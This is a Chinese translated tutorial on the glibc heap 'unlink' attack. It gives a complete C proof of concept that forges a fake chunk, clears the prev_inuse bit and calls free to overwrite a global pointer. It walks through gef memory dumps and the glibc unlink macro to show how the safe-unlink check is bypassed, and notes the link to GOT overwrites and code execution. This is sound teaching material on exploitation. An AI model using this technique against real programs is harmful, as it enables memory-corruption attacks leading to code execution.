# 堆利用之unlink
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## unlink实例
通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本
    #include 
    #include 
    #include 
    uint64_t *target;
    int main(void)
    {
        puts("So let's explain what a heap Unlink attack is.");
        puts("This will give us a write, however there are several restrictions on what we write and where.");
        puts("Also this attack is only really feasible on pre-tcache libc versions (before 2.26).\n");
        puts("For this attack to work, we need to know the address of a pointer to a heap pointer");
        puts("Think of something like a global variable (like in the bss) array which stores heap pointers.");
        puts("This attack will write a pointer to a little bit before the array (or the entry of the array that points to the heap chunk) to itself.");
        puts("This can be pretty useful for a variety of reasons, especially if we write the pointer to an array of pointers that we can edit. Then we can leverage the pointer from the unlink to overwrite pointers in the array.\n");
        printf("So we start off the attack by allocating two chunks, and storing the first chunk in the global variable pointer target\n");
        printf("The goal of this will be to overwrite the pointer to target with an address right before it.\n\n");
        uint64_t *ptr0, *ptr1, *temp;
        ptr0 = (uint64_t *)malloc(0xa0);
        ptr1 = (uint64_t *)malloc(0xa0);
        target = ptr0;      
        printf("The two chunk addresses are %p and %p\n", ptr0, ptr1);   //---------------> b1 
        printf("Target pointer stores the first chunk %p at %p\n\n", target, &target);
        printf("So what an unlink does, is it takes a chunk out of a doubly linked list (which certain freed chunks in the heap are stored in).\n");
        printf("It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.\n");
        printf("That is where we get our pointer write from. However in order to set this up, we will need to make a fake chunk that will pass three checks.\n");
        printf("So let's start setting up the fake chunk. \n\n");
        printf("The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have pointers back to our fake chunk.\n");
        printf("This is why we need the heap chunk our fake chunk is stored in to be stored in a pointer somewhere that we know the address of.\n");
        printf("So the previous chunks forward pointer (these chunks are stored in a doubly linked list), and the next chunks back pointer both have to point to this chunk.\n\n");
        printf("The forward pointer of this type of heap chunk is at offset 0x10, and the back pointer is at offset 0x18.\n");
        printf("As a result for the previous pointer we can just subtract 0x10 from the address of the target, and for the forward pointer we will just subtract 0x18 from the address of target.\n");
        target[2] = (uint64_t)(&target - 0x3);    // Fake Chunk P->fd pointer
        target[3] = (uint64_t)(&target - 0x2);    // Fake Chunk  P->bk pointer
        printf("Fd pointer: %p\n", (void *)ptr0[2]);  //---------------------------> b2
        printf("Bk  pointer: %p\n\n", (void *)ptr0[3]);
        temp = (uint64_t *)ptr0[2];
        printf("Fake chunk starts at \t%p\n", (void *)ptr0);
        printf("Fd->bk:    \t\t%p\n", (void *)temp[3]);
        temp = (uint64_t *)ptr0[3];
        printf("Bk->Fd:    \t\t%p\n\n", (void *)temp[2]);
        printf("With that, we will pass that check. Next we have to worry about the size check.\n");
        printf("How we will trigger a heap unlink is we will edit the heap metadata of the second chunk, so that it will say that the previous chunk has been freed and it points to our fake chunk.\n");
        printf("Then when we free the second chunk, it will cause our fake chunk to be unlinked and execute the pointer write.\n");
        printf("However it will check that the size of our chunk is equal to the previous size of the chunk being freed, so we have to make sure that they are equal.\n");
        printf("The previous size of the second chunk should be shrunk down so it thinks the heap metadata starts with our fake chunk. This typically means shrinking it by 0x10.\n");
        printf("In addition to that, we have to clear the previous in use bit from the size value of the second chunk, so it thinks that the previous chunk has been freed(this can be done with something like a heap overflow).\n");
        target[0] = 0x0;    // Fake Chunk  Previous Size
        target[1] = 0xa0;    // Fake Chunk  Size
        ptr1[-2] = 0xa0;    // Second Chunk previous size  
        ptr1[-1] = 0xb0;    // Secon Chunk size (can be done with a bug like a heap overflow)
        printf("The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.\n");
        printf("We will set it equal to 0x0 to avoid those unneeded checks.\n\n");
        target[4] = 0x0;    // fd_nextsize
        printf("With that, we have our fake chunk setup. Checkout the other writeups in this module for more details on the particular data structure of this heap chunk.\n\n");
        printf("Fake Chunk Previous Size:\t0x%x\n", (int)ptr0[0]);
        printf("Fake Chunk Size:\t\t0x%x\n", (int)ptr0[1]);
        printf("Fake Chunk Fd pointer:\t\t0x%x\n", (int)ptr0[2]);
        printf("Fake Chunk Bk pointer:\t\t0x%x\n", (int)ptr0[3]);
        printf("Fake Chunk fd_nextsize:\t\t0x%x\n\n", (int)ptr0[4]);
        printf("With that, we can free the second chunk and trigger the unlink.\n");
        free(ptr1); // ----------------------------------> b3
        printf("With that target should be the address of the Fd pointer: %p\n", target);
    }
红色箭头为在free(ptr1)之后target的指向
在b1处打断点，观察target的地址和储存值
target所在地址为bss全局变量区上的，存储的是ptr0指向的chunk1的地址0x5578420,与我们通过heap chunks观察到的地址相同。
在b2处打断点，观察内存情况
我们可以看到在target指向的heap
chunk1->data中的偏移16个字节和偏移24个字节的地方被赋值，内容为bss段上&target地址减去24和减去16。
    gef➤  (long *)&target -3
    0x555555756000              // &target -3的地址
    gef➤  (long *)&target -2
    0x555555756008              // &target -2的地址
在b3处打断点观察free之前的内存情况  
这个是Chunk1的内存情况
    gef➤  x/10gx 0x555555758420 - 16
    0x555555758410: 0x0000000000000000      0x00000000000000b1    // prev size | current size
    0x555555758420: 0x0000000000000000      0x00000000000000a0    // 
    0x555555758430: 0x0000555555756000      0x0000555555756008    // &target-3| &target-2
    0x555555758440: 0x0000000000000000      0x0000000000000000
    0x555555758450: 0x0000000000000000      0x0000000000000000
下面是chunk2的内存情况
    gef➤  x/10gx 0x5555557584d0 - 16
    0x5555557584c0: 0x00000000000000a0      0x00000000000000b0     // current的prev_inuse标志位被置0
    0x5555557584d0: 0x0000000000000000      0x0000000000000000
    0x5555557584e0: 0x0000000000000000      0x0000000000000000
    0x5555557584f0: 0x0000000000000000      0x0000000000000000
    0x555555758500: 0x0000000000000000      0x0000000000000000
free(ptr1)的操作会带来的影响，由于chunk2的prev_inuse标志位被置0，free函数会调用进行后向融合，free的源码如下
        /consolidate backward */
        if (!prev_inuse(p)) {
          prevsize = p->prev_size;                       // prev_size 为0xa0
          size += prevsize;
          p = chunk_at_offset(p, -((long) prevsize));   // 这个指向的是0x5555557584c0 - 0xa0 = 0x555555758420 就是target[0]的内存地址
          unlink(av, p, bck, fwd);
        }
所以unlink的参数p就是target[0]的地址0x555555758420  
为了知道unlink函数到底是如何操作了内存，我们继续看一下unlink的源码
    #define unlink(AV, P, BK, FD) {                                            \
        FD = P->fd;                                      \
        BK = P->bk;                                      \
        if (__builtin_expect (FD->bk != P || BK->fd != P, 0))              \
          malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
        else {                                      \
            FD->bk = BK;                                  \
            BK->fd = FD;                                  \
            if (!in_smallbin_range (P->size)                      \
                && __builtin_expect (P->fd_nextsize != NULL, 0)) {              \
            if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)          \
            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                      \
                       "corrupted double-linked list (not small)",    \
                       P, AV);                          \
                if (FD->fd_nextsize == NULL) {                      \
                    if (P->fd_nextsize == P)                      \
                      FD->fd_nextsize = FD->bk_nextsize = FD;              \
                    else {                                  \
                        FD->fd_nextsize = P->fd_nextsize;                  \
                        FD->bk_nextsize = P->bk_nextsize;                  \
                        P->fd_nextsize->bk_nextsize = FD;                  \
                        P->bk_nextsize->fd_nextsize = FD;                  \
                      }                                  \
                  } else {                                  \
                    P->fd_nextsize->bk_nextsize = P->bk_nextsize;              \
                    P->bk_nextsize->fd_nextsize = P->fd_nextsize;              \
                  }                                      \
              }                                      \
          }                                          \
    }
AV指向的是代表堆的数据结构malloc_state，P就是我们的target[0]地址，我们是在这个地方创建了一个假的chunk实际上。  
进来之后首先会进行一个检查，`FD->bk != P || BK->fd != P`
看看FD的bk指针是不是指向的就是P，BK的fd指针是否指向P，为什么要有这个检查？  
做这个检查主要是为了防止老版本的unlink导致的漏洞，正常的空闲链表是这样的
老版本的漏洞是，如果a2的fd和bk的值都已经被恶意修改了，比如利用一个堆溢出的漏洞修改了fd和bk，那么利用unlink就可以进行  
`a2->bk->fd =
a2->fd`,由于a2->bk和a2->fd都可以被攻击者控制，那么攻击者就可以实现在任何一个内存地址上写任何一个自己想要的值，配合修改got表中的内容就可以实现任意代码执行的效果。
通过添加这个检查可以避免这种漏洞, 在unlink之前先检查a2->bk->fd是不是就是指向的a2, 就可以避免这种漏洞。
但是这种检查还是可以被绕过的，比如我们的这个例子就是通过创造一个虚假的chunk实现绕过这个unlink的检查。  
现在a2就是target[0]的地址
    0x555555758420: 0x0000000000000000      0x00000000000000a0    // 
    0x555555758430: 0x0000555555756000      0x0000555555756008    // &target - 3  | &target - 2 
    0x555555758440: 0x0000000000000000      0x0000000000000000
    0x555555758450: 0x0000000000000000      0x0000000000000000
FD的值为0x0000555555756000  
BK的值为0x0000555555756008  
FD->bk值为0x0000555555756000的内存偏移24的位置存储的值,我们知道0x0000555555756000这个值是&target –
0x3， 它偏移24就是target的地址&target，他存储的值就是target,
而BK->fd为0x0000555555756008偏移16的位置存储的值，我们知道0x0000555555756008这个值是&target –
0x3，它偏移16也是&target，那么它存储的值也是target，而P就是target，所以就绕过了这个`FD->bk != P || BK->fd
!= P`的检查。  
而`FD->bk = BK`这个操作就是让存储target的内存设置为0x0000555555756008  
而`BK->fd = FD;`这个操作是让存储target的内存设置为0x0000555555756000 （ (uint64_t)(&target –
0x3); ）  
所以我们检查一下target的值最后是不是`0x0000555555756000`
    gef➤  x/g &target
    0x555555756018 :        0x0000555555756000
我们可以看到结果如我们的预测。  
这个到底有什么用呢？  
假如我们现在有一个数组是这样的
当我们通过这种unlink的攻击，可以让target的值为array的开头，就是&target